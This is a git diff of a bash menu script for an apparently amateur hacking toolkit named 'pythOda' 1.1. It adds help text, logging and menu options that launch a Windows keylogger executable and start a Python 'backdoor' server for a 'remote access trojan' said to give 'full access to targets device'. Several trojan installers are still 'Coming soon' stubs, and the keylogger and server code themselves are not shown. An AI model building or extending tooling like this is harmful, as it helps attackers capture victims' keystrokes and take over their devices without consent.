@@ -33,14 +33,19 @@ BG_CYAN='\e[0;46m'
 BG_WHITE='\e[0;47m'
 RESET='\e[0m'
 # Colors end
+CommandsHasTag="############################################################" # 60 Hashes
+HelpSummaryHasTag="##########################################################################################" # 90 Hashes
 OSNOTFOUNDTROJ="##################################################" # 50 Hashes
 TrojanUsedLineHashtag="######################################################################" # 70 Hashes
 KeyloggerLineHastag="#################################################################" # 65 Hashes
 HashTagShortLine="##########" # 10 Hashes
-logs="logs.txt"
+ServerFile="Hacks/BackdoorGeneral/server.py"
+logs="Logs/Start.log"
+ErrorLogFile="Logs/Error.log"
 versionnumb="1.1"
 current_time=$(date +"%Y-%B-%d %H:%M:%S")
 printWelcome() {
+    echo -e "${BOLD_WHITE}Welcome to pythOda. Version number: $versionnumb${RESET}"
     echo ""
     echo " ██████    ██      ██  ████████████  ██      ██     ███     ████          █████"
     echo " ██    ██   ██    ██        ██       ██      ██   ██   ██   ██  ██       ██   ██"
@@ -51,9 +56,14 @@ printWelcome() {
     echo " ██            ██           ██       ██      ██     ███     ████    ██             ██"
     echo ""
     echo "Pythoda started at // $current_time // Version: $versionnumb" >> $logs
+    echo -e "${BOLD_WHITE}Loading shell tools...${RESET}"
+    echo -e "${BOLD_WHITE}Please wait${RESET}"
+    sleep 3
 }
 
 printCommands() {
+    echo ""
+    echo $CommandsHasTag
     echo ""
     echo -e "          ${UNDERLINE_WHITE}Started at $current_time${RESET}"
     echo ""
@@ -61,32 +71,96 @@ printCommands() {
     echo -e "                  ${BOLD_WHITE}2{Remote access trojan}${RESET}"
     echo -e "                  ${BOLD_WHITE}3{idk}${RESET}"
     echo ""
+    echo -e "          ${UNDERLINE_WHITE}Misc commands $current_time${RESET}"
+    echo ""
+    echo -e "                  ${BOLD_WHITE}10{Version number}${RESET}"
+    echo -e "                  ${BOLD_WHITE}11{Display error log}${RESET}"
+    echo -e "                  ${BOLD_WHITE}12{Display commands}${RESET}"
+    echo -e "                  ${BOLD_WHITE}13{Clear & Print commands}${RESET}"
+    echo -e "                  ${BOLD_WHITE}14{Help Summary}${RESET}"
+    echo -e "                  ${BOLD_WHITE}15{Exit}${RESET}"
+    echo ""
+    echo $CommandsHasTag
+    echo ""
 }
 
+HelpSummary() {
+    echo ""
+    echo $HelpSummaryHasTag
+    echo ""
+    echo -e "          ${UNDERLINE_WHITE}Help summary started at $current_time${RESET}"
+    echo ""
+    echo -e "                  ${BOLD_WHITE}1{Keylogger}${RESET} // Saves into a txt file users keyboard input"
+    echo -e "                  ${BOLD_WHITE}2{Remote access trojan}${RESET} // Gives a full access to targets device"
+    echo -e "                  ${BOLD_WHITE}3{idk}${RESET} // Undone"
+    echo ""
+    echo -e "          ${UNDERLINE_WHITE}Misc commands $current_time${RESET}"
+    echo ""
+    echo -e "                  ${BOLD_WHITE}10{Version number}${RESET} // Prints version number"
+    echo -e "                  ${BOLD_WHITE}11{Display error log}${RESET} // Displays the error log onto the screen"
+    echo -e "                  ${BOLD_WHITE}12{Display commands}${RESET} // Prints all of the commands"
+    echo -e "                  ${BOLD_WHITE}13{Clear & Print commands}${RESET} // Clears the terminal and prints commands"
+    echo -e "                  ${BOLD_WHITE}14{Help Summary}${RESET} // Prints a text summary that gives info about the commands"
+    echo -e "                  ${BOLD_WHITE}15{Exit}${RESET} // Exits the tool"
+    echo ""
+    echo $HelpSummaryHasTag
+    echo ""
+}
+
+ctrl_c() {
+    echo ""
+    echo "Exiting..."
+    exit 1
+}
+trap ctrl_c INT
+# Hack functions
 KeyloggerWIN() {
     Hacks/KeyloggerWINDOWS/WINkeylogger.exe
 }
+
+BackDoorTrojanLinuxINS() {
+    echo "Coming soon" # For Linux
+}
+
+BackDoorTrojanWinINS() { 
+    echo "Coming soon" # For Windows
+}
+
+BackDoorTrojanAndrINS() {
+    echo "Coming soon" # For android
+}
+
+BackDoorTrojanIosINS() {
+    echo "Coming soon" # For Ios
+}
+
+BackDoorTrojanServerStart() {
+    python3 $ServerFile
+}
+
+# End 
 
 printWelcome
 printCommands
 while true
 do
-    printf "${UNDERLINE_WHITE}Enter a command:${RESET} "
+    printf "${BOLD_WHITE}Enter a command:${RESET} "
     read CommandInput
 
     if [[ $CommandInput == "1" ]]; then
         echo ""
         echo $KeyloggerLineHastag
         echo ""
-        echo -e "      ${BOLD_WHITE}Please enter a operating system for the keylogger${RESET}"
+        echo -e "      ${BOLD_WHITE}Please enter a operating system for the keylogger attack${RESET}"
         echo ""
         echo -e "                          ${BOLD_WHITE}1{Windows}${RESET}"
         echo -e "                          ${BOLD_WHITE}2{linux}${RESET}"
         echo -e "                          ${BOLD_WHITE}3{Android/Ios}${RESET}"
+        echo -e "                          ${BOLD_WHITE}4{Ios}${RESET}"
         echo ""
         echo $KeyloggerLineHastag
         echo ""
-        printf "Enter a os: "
+        printf "${BOLD_WHITE}Enter a os:${RESET} "
         read EnterKeyloggerOS
         # Enter os
         if [[ $EnterKeyloggerOS == "1" ]]; then
@@ -98,7 +172,9 @@ do
             echo "Hello world3"
         else
             echo $OSNOTFOUNDTROJ
-            echo "                  OS NOT FOUND"
+            echo ""
+            echo -e "                  ${UNDERLINE_WHITE}OS NOT FOUND${RESET}"
+            echo ""
             echo $OSNOTFOUNDTROJ
         fi
         # Enter os
@@ -107,29 +183,50 @@ do
             echo ""
             echo $TrojanUsedLineHashtag
             echo ""
-            echo "      Please enter a operating system for the remote access trojan"
+            echo -e "      ${BOLD_WHITE}Please enter a operating system for the remote access trojan attack${RESET}"
             echo ""
-            echo "                          1{Linux}"
-            echo "                          2{Windows}"
-            echo "                          3{Android/Ios}"
+            echo -e "                          ${BOLD_WHITE}1{Linux}${RESET}"
+            echo -e "                          ${BOLD_WHITE}2{Windows}${RESET}"
+            echo -e "                          ${BOLD_WHITE}3{Android/Ios}${RESET}"
+            echo -e "                          ${BOLD_WHITE}4{Ios}${RESET}"
             echo ""
             echo $TrojanUsedLineHashtag
             echo ""
 
-            printf "Enter a os: "
+            printf "${BOLD_WHITE}Enter a os:${RESET} "
             read TrojanOs
             
 
             if [[ $TrojanOs == "1" ]]; then
-                echo "Test1"
+                echo "Hello"
+                python3 $ServerFile # GOTTA BE LAST
             elif [[ $TrojanOs == "2" ]]; then
                 echo "Test2"
             elif [[ $TrojanOs == "3" ]]; then
                 echo "Test3"
             else 
                 echo $OSNOTFOUNDTROJ
-                echo "                  OS NOT FOUND"
+                echo ""
+                echo -e "                  ${UNDERLINE_WHITE}OS NOT FOUND${RESET}"
+                echo ""
                 echo $OSNOTFOUNDTROJ
             fi
+        # Misc commands
+
+        elif [[ $CommandInput == "10" ]]; then 
+            echo "PythOda. Version number: $versionnumb"
+        elif [[ $CommandInput == "11" ]]; then 
+            cat $ErrorLogFile
+        elif [[ $CommandInput == "12" ]]; then 
+            printCommands
+        elif [[ $CommandInput == "13" ]]; then 
+            clear
+            printCommands
+        elif [[ $CommandInput == "14" ]]; then 
+            HelpSummary
+        elif [[ $CommandInput == "15" ]]; then 
+            break
+        else
+            echo "Command was invalid or not found // The error command: ${CommandInput} // Time: ${current_time} // Version number: $versionnumb" >> $ErrorLogFile
     fi
 done
